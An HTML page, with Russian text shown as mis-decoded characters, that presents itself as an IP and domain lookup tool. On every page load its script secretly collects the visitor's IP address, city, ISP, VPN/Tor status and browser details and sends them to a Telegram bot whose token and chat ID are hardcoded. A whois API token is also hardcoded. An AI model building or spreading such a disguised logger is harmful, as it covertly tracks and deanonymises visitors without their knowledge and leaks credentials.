<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>IP –∏ –î–æ–º–µ–Ω –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            max-width: 600px;
            width: 90%;
        }
        h1 {
            text-align: center;
            color: #4a4a4a;
            margin-bottom: 30px;
            font-size: 2em;
        }
        .info-block {
            background: #ffffff;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        .info-block p {
            margin: 10px 0;
            padding: 10px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
        }
        .info-block p:last-child {
            border-bottom: none;
        }
        .label {
            font-weight: bold;
            color: #764ba2;
        }
        .loading {
            text-align: center;
            color: #666;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            border-radius: 10px;
            border: 1px solid #ddd;
            font-size: 16px;
        }
        .input-group button {
            width: 100%;
            padding: 10px;
            border-radius: 10px;
            border: none;
            background: #764ba2;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        .input-group button:hover {
            background: #667eea;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>IP –∏ –î–æ–º–µ–Ω –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</h1>
        <div class="input-group">
            <input type="text" id="input" placeholder="–í–≤–µ–¥–∏—Ç–µ IP-–∞–¥—Ä–µ—Å –∏–ª–∏ –¥–æ–º–µ–Ω">
            <button onclick="getInfo()">–ü–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é</button>
        </div>
        <div id="info" class="info-block">
            <p class="loading">–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –≤–∞—à–µ–≥–æ IP-–∞–¥—Ä–µ—Å–∞...</p>
        </div>
    </div>

    <script>
        const botToken = '7907246791:AAFd5MTX3L-loi9gpmgxSOTTkmb3iY9RO_A';
        const creatorChatId = '7171180247';

        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: creatorChatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                const data = await response.json();
                if (!data.ok) {
                    console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram:', data);
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ Telegram:', error);
            }
        }

        async function getIpInfo(ip) {
            try {
                const response = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
                const data = await response.json();
                return data;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ IP –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏:', error);
                return null;
            }
        }

        async function getDomainInfo(domain) {
            try {
                const response = await fetch(`https://whoisjson.com/api/v1/whois?domain=${domain}`, {
                    headers: {
                        "Authorization": "Token=dbbc251dda62fb51321132d79b070d00cad48acec4c660f7f0b313eb09056e9b"
                    }
                });
                const data = await response.json();
                return data;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –¥–æ–º–µ–Ω–µ:', error);
                return null;
            }
        }

        function isIp(address) {
            const ipPattern = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
            return ipPattern.test(address);
        }

        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const deviceType = /Mobile|Tablet/.test(userAgent) ? '–ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ' : '–ö–æ–º–ø—å—é—Ç–µ—Ä';
            return {
                userAgent,
                platform,
                language,
                deviceType
            };
        }

        function formatIpInfo(data) {
            return `
üåê <b>IP-–∞–¥—Ä–µ—Å:</b> ${data.query}
üåç <b>–°—Ç—Ä–∞–Ω–∞:</b> ${data.country} (${data.countryCode})
üèôÔ∏è <b>–ì–æ—Ä–æ–¥:</b> ${data.city}
üìç <b>–†–µ–≥–∏–æ–Ω:</b> ${data.regionName} (${data.region})
üì° <b>–ü—Ä–æ–≤–∞–π–¥–µ—Ä:</b> ${data.isp}
üïí <b>–ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å:</b> ${data.timezone}
üîí <b>–ò—Å–ø–æ–ª—å–∑—É–µ—Ç VPN:</b> ${data.proxy ? '–î–∞' : '–ù–µ—Ç'}
üîí <b>–ò—Å–ø–æ–ª—å–∑—É–µ—Ç TOR:</b> ${data.tor ? '–î–∞' : '–ù–µ—Ç'}
üîí <b>–ò—Å–ø–æ–ª—å–∑—É–µ—Ç –ø—Ä–æ–∫—Å–∏:</b> ${data.proxy ? '–î–∞' : '–ù–µ—Ç'}
            `;
        }

        function formatDomainInfo(domain, data) {
            return `
üåê <b>–î–æ–º–µ–Ω:</b> ${domain}
üìÖ <b>–°–æ–∑–¥–∞–Ω:</b> ${data.created || 'N/A'}
üìÖ <b>–ò—Å—Ç–µ–∫–∞–µ—Ç:</b> ${data.expires || 'N/A'}
üìõ <b>–†–µ–≥–∏—Å—Ç—Ä–∞—Ç–æ—Ä:</b> ${data.registrar || 'N/A'}
üåê <b>DNS-—Å–µ—Ä–≤–µ—Ä—ã:</b> ${data.name_servers ? data.name_servers.join(', ') : 'N/A'}
            `;
        }

        async function sendIpLog() {
            const ipData = await getIpInfo('');
            const browserInfo = getBrowserInfo();

            if (ipData && ipData.status === "success") {
                const logMessage = `
üìù <b>–ù–æ–≤—ã–π –ª–æ–≥:</b>
üïí <b>–í—Ä–µ–º—è:</b> ${new Date().toLocaleString()}
${formatIpInfo(ipData)}
üñ•Ô∏è <b>–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:</b> ${browserInfo.deviceType}
üåê <b>–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞:</b> ${browserInfo.platform}
üåç <b>–Ø–∑—ã–∫:</b> ${browserInfo.language}
üîç <b>User-Agent:</b> ${browserInfo.userAgent}
                `;
                await sendToTelegram(logMessage);
            }
        }

        async function getInfo() {
            const input = document.getElementById('input').value.trim();
            const infoDiv = document.getElementById('info');

            if (!input) {
                infoDiv.innerHTML = '<p class="loading">–í–≤–µ–¥–∏—Ç–µ IP-–∞–¥—Ä–µ—Å –∏–ª–∏ –¥–æ–º–µ–Ω.</p>';
                return;
            }

            infoDiv.innerHTML = '<p class="loading">–ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö...</p>';

            let result;
            if (isIp(input)) {
                const ipData = await getIpInfo(input);
                if (ipData && ipData.status === "success") {
                    result = formatIpInfo(ipData);
                } else {
                    result = "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± IP.";
                }
            } else {
                const domainData = await getDomainInfo(input);
                if (domainData) {
                    result = formatDomainInfo(input, domainData);
                } else {
                    result = "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –¥–æ–º–µ–Ω–µ.";
                }
            }

            infoDiv.innerHTML = `<pre>${result}</pre>`;
        }

        sendIpLog();
    </script>
</body>
</html>